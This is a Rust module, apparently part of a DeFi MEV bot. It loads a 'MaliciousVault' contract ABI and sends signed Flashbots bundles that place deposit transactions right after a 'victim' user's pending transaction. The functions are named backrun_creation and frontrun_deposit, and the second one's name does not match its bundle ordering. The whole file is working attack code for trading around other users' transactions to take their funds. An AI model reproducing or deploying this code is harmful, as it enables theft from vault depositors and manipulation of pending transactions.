use ethers::core::types::{H256,Bytes as EthBytes};
use eyre::Result;
use alloy::{
    dyn_abi::DynSolValue, json_abi::JsonAbi, network::{EthereumWallet, TransactionBuilder}, primitives::{Address, Bytes, U256}, rpc::types::TransactionRequest
};
use alloy_contract::Interface;
use alloy_eips::eip2718::Encodable2718;

use ethers_signers::LocalWallet;


use jsonrpsee_http_client::{transport, HttpClientBuilder};
use mev_share_rpc_api::{BundleItem, FlashbotsSignerLayer, MevApiClient, SendBundleRequest};
use std::fs;


use super::helpers::NewPendingTx;
use crate::utils::constants::Env;

struct Client {
    inner: Box<dyn MevApiClient>,
}

pub struct Executor {
    pub vault_interface: Interface,
    pub client: Client,
}

impl Executor {
    pub fn new() -> Self {
        let env = Env::new();

        let identity = env.identity_key.parse::<LocalWallet>().unwrap();

        let http = HttpClientBuilder::default()
            .set_middleware(
                tower::ServiceBuilder::new()
                    .map_err(transport::Error::Http)
                    .layer(FlashbotsSignerLayer::new(identity)),
            )
            .build("https://relay.flashbots.net:443")
            .unwrap();
        let client = Client { inner: Box::new(http) };

        let vault_interface = {
            let path = "src/data/contract_abis/MaliciousVault.json";
            let json = fs::read_to_string(path).unwrap();
            let abi: JsonAbi = serde_json::from_str(&json).unwrap();
            Interface::new(abi)
        };

        Self {
            vault_interface,
            client,
        }
    }   

    pub async fn backrun_creation(
        &self,
        pending_tx: &mut NewPendingTx,
        vault_address: Address,
        signer: EthereumWallet,
    ) -> Result<()> {
        let victim_tx_hash = H256::from_slice(pending_tx.tx.hash.as_slice());

        let call_data = Bytes::copy_from_slice(
            self.vault_interface.encode_input(
                "deposit",
                &[
                        DynSolValue::Uint(U256::from(1_000000000000000000_u128), 256),
                        DynSolValue::Address(signer.default_signer().address())
                    ]
                )?
            .as_slice());
    
        let backrun_tx = TransactionRequest::default()
            .with_to(vault_address)
            .with_input(call_data)
            .with_max_priority_fee_per_gas(1_000_000_000)
            .with_max_fee_per_gas(20_000_000_000);
    
        let backrun_signed = backrun_tx.build(&signer).await?;
    
        let mut encoded = vec![];
        backrun_signed.encode_2718(&mut encoded);
        let converted_bytes: EthBytes = EthBytes::from(encoded);
    
        // Build bundle
        let mut bundle_body = Vec::new();
        bundle_body.push(BundleItem::Hash { hash: victim_tx_hash });
        bundle_body.push(BundleItem::Tx { tx: converted_bytes, can_revert: false });
    
        let bundle = SendBundleRequest { bundle_body, ..Default::default() };
    
        // Send bundle
        let resp = self.client.inner.send_bundle(bundle.clone()).await;
        println!("Got a bundle response: {:?}", resp);
    
        // Simulate bundle 
        // let sim_res = self.client.sim_bundle(bundle, Default::default()).await;
        // println!("Got a simulation response: {:?}", sim_res);
        Ok(())
    }

    pub async fn frontrun_deposit(
        &self,
        pending_tx: &mut NewPendingTx,
        vault_address: Address,
        signer: EthereumWallet,
    ) -> Result<()> {
        let victim_tx_hash = H256::from_slice(pending_tx.tx.hash.as_slice());

        let call_data = Bytes::copy_from_slice(
            self.vault_interface.encode_input(
                "deposit",
                &[
                        DynSolValue::Uint(U256::from(2_500_000_000u64), 256),
                        DynSolValue::Address(signer.default_signer().address())
                    ]
                )?
            .as_slice());
    
        let backrun_tx = TransactionRequest::default()
            .with_to(vault_address)
            .with_input(call_data)
            .with_max_priority_fee_per_gas(1_000_000_000)
            .with_max_fee_per_gas(20_000_000_000);
    
        let backrun_signed = backrun_tx.build(&signer).await?;
    
        let mut encoded = vec![];
        backrun_signed.encode_2718(&mut encoded);
        let converted_bytes: EthBytes = EthBytes::from(encoded);
    
        // Build bundle
        let mut bundle_body = Vec::new();
        bundle_body.push(BundleItem::Hash { hash: victim_tx_hash });
        bundle_body.push(BundleItem::Tx { tx: converted_bytes, can_revert: false });
    
        let bundle = SendBundleRequest { bundle_body, ..Default::default() };
    
        // Send bundle
        let resp = self.client.inner.send_bundle(bundle.clone()).await;
        println!("Got a bundle response: {:?}", resp);
    
        // Simulate bundle 
        // let sim_res = self.client.sim_bundle(bundle, Default::default()).await;
        // println!("Got a simulation response: {:?}", sim_res);
        Ok(())
    }

}